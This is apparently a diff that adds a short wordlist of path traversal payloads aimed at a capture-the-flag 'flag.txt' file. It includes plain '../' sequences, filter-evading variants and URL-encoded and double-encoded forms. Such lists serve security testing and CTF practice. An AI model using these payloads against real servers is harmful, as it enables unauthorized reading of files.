@@ -1,0 +1,7 @@
+../flag.txt
+../../flag.txt
+....//flag.txt
+..././flag.txt
+..%2F..%2F..%2Fflag.txt
+%2e%2e%2e%2e%2f%2fflag.txt
+%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66flag.txt
